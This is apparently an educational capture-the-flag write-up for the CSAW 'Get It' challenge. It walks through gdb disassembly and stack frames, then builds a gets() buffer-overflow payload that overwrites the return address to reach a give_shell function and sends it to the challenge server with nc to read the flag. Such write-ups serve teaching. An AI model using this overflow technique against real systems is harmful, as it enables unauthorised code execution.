# Get It
Description: Do you get it?
points: 50
host: pwn.chal.csaw.io
port: 9001

This writeup will walk through, in detail, how to solve this challenge using primarily gdb.

## Running the program
One of the first things to do is to run the program. After downloading the binary on Linux, ensure it is executable with `chmod +x get_it`. Then it can be executed with `./get_it`:
```
$ chmod +x get_it
$ ./get_it
Do you gets it??
AAAA
```
What this program does is print, "Do you gets it??", then it seems to read user input until a newline is sent, then it exits.

## Goal
Like most pwn challenges, the goal here is to get a shell and then print out a flag on a remote server. Using gdb, we can print out the list of defined functions
```
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400470  puts@plt
0x0000000000400480  system@plt
0x0000000000400490  __libc_start_main@plt
0x00000000004004a0  gets@plt
0x00000000004004b0  __gmon_start__@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x00000000004005b6  give_shell
0x00000000004005c7  main
0x0000000000400600  __libc_csu_init
0x0000000000400670  __libc_csu_fini
0x0000000000400674  _fini
```
The line that immidiately sticks out is: `0x00000000004005b6  give_shell`. Our goal is to get a shell, and there is a function that claims to give us a shell. We can double check that this function does what it says it does by disassembing it:
```
(gdb) disassemble give_shell 
Dump of assembler code for function give_shell:
   0x00000000004005b6 <+0>:     push   rbp
   0x00000000004005b7 <+1>:     mov    rbp,rsp
   0x00000000004005ba <+4>:     mov    edi,0x400684
   0x00000000004005bf <+9>:     call   0x400480 <system@plt>
   0x00000000004005c4 <+14>:    nop
   0x00000000004005c5 <+15>:    pop    rbp
   0x00000000004005c6 <+16>:    ret    
End of assembler dump.
```
If you do not understand this at first, it is okay. Essentially, this calls the `system` function with the argument 0x400684, which is a pointer to a memory location:
```
(gdb) x/s 0x400684
0x400684:       "/bin/bash"
```
So what is being executed by `give_shell()` is `system("/bin/bash")`. This will give us a shell.

## Reverse engineering
In gdb, you can print out the instructions that are executed as follows:
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:     push   rbp
   0x00000000004005c8 <+1>:     mov    rbp,rsp
   0x00000000004005cb <+4>:     sub    rsp,0x30
   0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave
   0x00000000004005f7 <+48>:    ret
End of assembler dump.
```
The only thing this does is `call` two functions: `puts` and `gets`. Everything else is setting up arguments or taking care of the stack frame (which we will come back to).

### puts
Let us start by understanding what the `call 0x400470 <puts@plt>` instruction does.

Puts is documented on the man pages, accessible with the command `man 3 puts`, or available online here: <https://linux.die.net/man/3/puts>.
```int puts(const char *s);```
The `puts` function has one argument, a pointer to a char. 

We now need to understand how arguments are passed in this assembly. For any function, `function(arg1, arg2, arg3)`, the arguments are stored in assembly registers as follows:
```
arg1: RDI
arg2: RSI
arg3: RDX
```
There are more, but they do not matter for this challenge. Registers can be thought of as a sort of variable.

In this example, you should assume that `edi = rdi`, `esi = rsi`, and `edx = rdx`, but in actuality, registers starting with an 'e' are a portion of the respective register that starts with an `r`.

Remember, `puts` has only one argument: `const char *s`. As previously explained, this argument should be stored in `rdi` (and `edi`)
```
0x00000000004005d6 <+15>:    mov    edi,0x40068e
0x00000000004005db <+20>:    call   0x400470 <puts@plt>
```
The `mov a, b` instruction can be interpreted as `a = b`.

That line in the assembly can then be interpreted as `edi = 0x40068e`.

In gdb now, we can determine what that seemingly arbitrary hex number means.
```
(gdb) x/s 0x40068e
0x40068e:       "Do you gets it??"
```
As it turns out, that number is pointing to the "Do you gets it??" string in memory, which is what we saw printed out when we ran the program.

Now that we can see what the `puts` call is doing, it is time to move on to the `gets` call.

### gets
From <https://linux.die.net/man/3/gets>:
```
gets(char * s) reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (aq\0aq). No check for buffer overrun is performed (see BUGS below). 

Bugs
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead. 
```

So, as we can see, `gets(char * s)` accepts one argument, the location in memory that it will write to, and then it will write all the characters that you type in.

Here is the assembly setting the arguments to gets:
```
0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
0x00000000004005e4 <+29>:    mov    rdi,rax
0x00000000004005e7 <+32>:    mov    eax,0x0
0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
```
The `lea` instruction just does some math. In this case, it means `rax = rbp - 0x20`

The next thing to explain is what `rbp` is and what that `-0x20` means in context.

## Stack Frame
There are different memory locations, heap, stack, bss, text/code, and more. The stack is where local variables are stored. Heap is where dynamically allocated variables are. BSS is for global variables. text (aka code) is where your code and constants are stored (like constant strings). 

Right now, all we care about is the stack. The way functions keep track of their state, without corrupting the state of other functions, is by using what is called a "stack frame." In memory, a stack frame looks like this:

![Stack Frame](https://i.stack.imgur.com/DAMVU.png)

Whenever a function is called, it pushes its own stack frame on the stack. Information stored in the stack frame contains the function's local variables, the location in memory that the function must return to, and the location on the stack of the stack frame of its parent function.

In this image, ignore the "parameters" They represent arguments to functions, and they are held in the stack frame in 32 bit, but for the most part, in 64 bit (this example) arguments are not stored on the stack, they are stored in registers. The most important part of this is that each function must keep track of its local variables and where it returns to when the function finishes.

Something has to keep track of where the stack is in memory, however. This is what the registers RBP and RSP are for. (ebp and esp in the diagram and on 32 bit computers)

`RSP` is called the "stack pointer." It points to the top of the current stack frame.
`RBP` is called the "base pointer." It points to the bottom of the current stack frame.


And that brings us back to the assembly we were looking at earlier:
```
0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
0x00000000004005e4 <+29>:    mov    rdi,rax
0x00000000004005e7 <+32>:    mov    eax,0x0
0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
```
So what `lea rax, [rbp-0x20]` does is get the address of some local variable and load it into rax. Now we can figure out what the argument for `gets` is.
```
gets(some_local_variable_at RBP - 0x20)
```
Its argument is just some buffer that is sitting in the stack frame.

As an aside, `0x20 = 32`.


And, looking at the image of the stack frame, we can deduce that the stack looks something like this
```
RBP - 32  : somebufferwithlength32
RBP       : Old stack frame pointer
RBP + 8   : return address
```

So, with `RBP = 0x20 = 32 the stack would look like this (With `A`s filling the local variable buffer that gets is called with):
```
00000000: 0x4141414141414141  AAAAAAAA // 0
00000008: 0x4141414141414141  AAAAAAAA // 8
00000010: 0x4141414141414141  AAAAAAAA // 16
00000018: 0x4141414141414141  AAAAAAAA // 24
00000020: 0x4f4c4453544b4652  OLDSTKFR // 32 <- RBP
00000028: 0x52455455524e4144  RETURNAD // 40
```

Now let's examine this in GDB.
## Debugging
Remember what the disassembly looked like:
```
0x00000000004005c7 <+0>:     push   rbp
0x00000000004005c8 <+1>:     mov    rbp,rsp
0x00000000004005cb <+4>:     sub    rsp,0x30
0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
0x00000000004005d6 <+15>:    mov    edi,0x40068e
0x00000000004005db <+20>:    call   0x400470 <puts@plt>
0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
0x00000000004005e4 <+29>:    mov    rdi,rax
0x00000000004005e7 <+32>:    mov    eax,0x0
0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
0x00000000004005f1 <+42>:    mov    eax,0x0
0x00000000004005f6 <+47>:    leave
0x00000000004005f7 <+48>:    ret
```
We are going to break at the end of main after sending exactly 31 As, then examine the memory of the stack.
```
(gdb) break *main+47
Breakpoint 1 at 0x4005f6
(gdb) run
Starting program: ./get_it
Do you gets it??
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x00000000004005f6 in main ()
```

Now we will examine the stack in gdb.
The command `x/6xg $rbp - 0x20` prints 48 bytes in the memory location specified by `rbp-32`.
```
(gdb) x/6xg $rbp - 0x20
0x7fffffffe130: 0x4141414141414141
0x7fffffffe138: 0x4141414141414141
0x7fffffffe140: 0x4141414141414141
0x7fffffffe148: 0x0041414141414141
0x7fffffffe150: 0x0000000000400600
0x7fffffffe158: 0x00007ffff7dff223
```

This lines up with what we had earlier:
```
0x7fffffffe130: 0x4141414141414141 // The buffer            @ RBP - 0x20
0x7fffffffe138: 0x4141414141414141
0x7fffffffe140: 0x4141414141414141
0x7fffffffe148: 0x0041414141414141
0x7fffffffe150: 0x0000000000400600 // saved stack pointer   @ RBP
0x7fffffffe158: 0x00007ffff7dff223 // return address        @ RBP + 8
```

You can print `rbp` in gdb to see that this does in fact line up with our expectations:
```
(gdb) print $rbp
$1 = (void *) 0x7fffffffe150
```

Now, still in gdb, if you run the `nexti` command, you will step forward two instructions and return from `main`. Then we see that the address that is being executed is the exact same as the return address specified.
```
(gdb) nexti
0x00000000004005f7 in main ()
(gdb) nexti
0x00007ffff7dff223 in __libc_start_main () from /usr/lib/libc.so.6
```

## Exploitation
Now, back to the beginning. We want to jump to the `give_shell` function. All we have to do is change the return address to the address of `give_shell.` We can find the address of `give_shell` in gdb with the `print` command:
```
(gdb) p give_shell 
$1 = {<text variable, no debug info>} 0x4005b6 <give_shell>
```

So, since `gets` will read an unlimited amount of data, we can overwrite the return address to whatever we want. We can again see this in gdb:
```
(gdb) break * main+47
Breakpoint 1 at 0x4005f6
(gdb) run
Starting program: /home/nat/workspace/2018-2019/csaw/get_it/get_it 
Do you gets it??
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC

Breakpoint 1, 0x00000000004005f6 in main ()
(gdb) x/6xg $rbp - 0x20
0x7fffffffe130: 0x4141414141414141      0x4141414141414141
0x7fffffffe140: 0x4141414141414141      0x4141414141414141
0x7fffffffe150: 0x4242424242424242      0x4343434343434343
```

Our return address is now full of `C`s! All that is left is replacing the `C`s with the address of give_shell.

Exiting gdb now, we can use python to convert the hex address to something that the program will parse as an address.
```python
$ python2
>>> import struct
>>> struct.pack('<Q', 0x4005b6)
'\xb6\x05@\x00\x00\x00\x00\x00'
```
Generating the payload and saving it to a file is now a one line command:
```
python2 -c "print 'A' * 32 + 'B'*8 + '\xb6\x05@\x00\x00\x00\x00\x00'" > payload
```

You can test this payload in gdb like so:
```
(gdb) break * main+47
Breakpoint 1 at 0x4005f6
(gdb) run < payload
Starting program: /home/cygnus/get_it < payload
Do you gets it??

Breakpoint 1, 0x00000000004005f6 in main ()
(gdb) x/6xg $rbp - 0x20
0x7ffffffee020: 0x4141414141414141      0x4141414141414141
0x7ffffffee030: 0x4141414141414141      0x4141414141414141
0x7ffffffee040: 0x4242424242424242      0x00000000004005b6
(gdb) nexti
0x00000000004005f7 in main ()
(gdb) nexti
0x00000000004005b6 in give_shell ()
```
As you can see, we have now entered the `give_shell()` function.

Now to actually run the exploit.
```
$ (cat payload; cat) | ./get_it
Do you gets it??
whoami
root
```
What `(cat payload; cat)` does is simpily send your payload and the input that you type to get_it. Now you have a shell and can execute shell commands!

## Acquiring the flag
To get the flag, you just need to run the exploit against the remote server like so:
```
$ (cat payload; cat) | nc pwn.chal.csaw.io 9001
            _     _ _  ___ ___ ___
  __ _  ___| |_  (_) ||__ \__ \__ \
 / _` |/ _ \ __| | | __|/ / / / / /
| (_| |  __/ |_  | | |_|_| |_| |_|
 \__, |\___|\__| |_|\__(_) (_) (_)
 |___/
Do you gets it??
ls
art.txt  flag.txt  get_it  run.sh
cat flag.txt
flag{y0u_deF_get_itls}
```
Flag:
```
flag{y0u_deF_get_itls}
```
